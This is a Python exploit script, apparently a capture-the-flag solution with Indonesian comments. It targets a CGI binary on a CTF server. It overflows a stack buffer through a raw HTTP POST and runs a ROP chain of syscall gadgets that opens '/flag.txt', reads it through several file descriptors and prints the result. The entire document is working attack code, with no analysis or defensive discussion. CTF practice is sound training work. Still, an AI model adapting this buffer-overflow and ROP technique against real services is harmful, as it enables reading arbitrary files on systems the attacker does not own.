#!/usr/bin/env python3
import socket, struct, re

def p64(x): return struct.pack("<Q", x)

HOST = "gzcli.techcomfest.1pc.tf"
PORT = 61555
CGI  = "/cgi-bin/httpwn.cgi"

# Gadgets/addrs dari build static -no-pie
POP_RDI           = 0x401d80          # pop rdi ; ret
POP_RSI           = 0x40f772          # pop rsi ; ret
POP_RDX_RBX       = 0x469697          # pop rdx ; pop rbx ; ret
POP_RAX           = 0x438767          # pop rax ; ret
MOV_QWORD_RDI_RDX = 0x430813          # mov qword ptr [rdi], rdx ; ret
SYSCALL_RET       = 0x417ca2          # syscall ; ret

BSS               = 0x4a7270          # __bss_start
BUF               = BSS + 0x200
OFFSET_SAVED_RBP  = 0x60              # data[] berada di rbp-0x60

def rop_write_qword(addr, qword):
    return b"".join([
        p64(POP_RDI), p64(addr),
        p64(POP_RDX_RBX), p64(qword), p64(0),
        p64(MOV_QWORD_RDI_RDX),
    ])

def rop_syscall(rax, rdi, rsi, rdx):
    return b"".join([
        p64(POP_RDI), p64(rdi),
        p64(POP_RSI), p64(rsi),
        p64(POP_RDX_RBX), p64(rdx), p64(0),
        p64(POP_RAX), p64(rax),
        p64(SYSCALL_RET),
    ])

def build_rop():
    rop = b""

    # write "/flag.txt\x00" ke .bss
    path = b"/flag.txt\x00"
    path += b"\x00" * ((8 - (len(path) % 8)) % 8)
    for i in range(0, len(path), 8):
        rop += rop_write_qword(BSS + i, int.from_bytes(path[i:i+8], "little"))

    # open("/flag.txt", O_RDONLY=0, 0)
    rop += rop_syscall(2, BSS, 0, 0)

    # robust: coba fd 3..12 (kalau open() gak balik 3 karena banyak FD kebuka di CGI)
    for fd in range(3, 13):
        # read(fd, BUF, 0x100)
        rop += rop_syscall(0, fd, BUF, 0x100)
        # write(1, BUF, 0x100)
        rop += rop_syscall(1, 1, BUF, 0x100)

    # exit(0)
    rop += rop_syscall(60, 0, 0, 0)
    return rop

def build_payload():
    rop = build_rop()

    # bikin strcpy(username, data+9) gak “ngerusak” payload:
    # data dimulai "username=" lalu langsung NUL, jadi strcpy copy string kosong
    prefix = b"username=" + b"\x00"

    pad = b"A" * (OFFSET_SAVED_RBP - len(prefix))
    saved_rbp = p64(0)

    return prefix + pad + saved_rbp + rop

def http_post_raw(host, port, path, body: bytes) -> bytes:
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body

    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(req)
        chunks = []
        while True:
            d = s.recv(4096)
            if not d:
                break
            chunks.append(d)
    return b"".join(chunks)

def main():
    payload = build_payload()
    resp = http_post_raw(HOST, PORT, CGI, payload)

    # ambil body HTTP
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else resp

    # bersihin NUL biar gampang di-print
    text = body.replace(b"\x00", b"").decode("utf-8", errors="ignore")

    # cari pola flag umum: SOMETHING{...}
    m = re.search(r"[A-Za-z0-9_]{2,}\{[^}\n]+\}", text)
    if m:
        print(m.group(0))
    else:
        print(text)

if __name__ == "__main__":
    main()
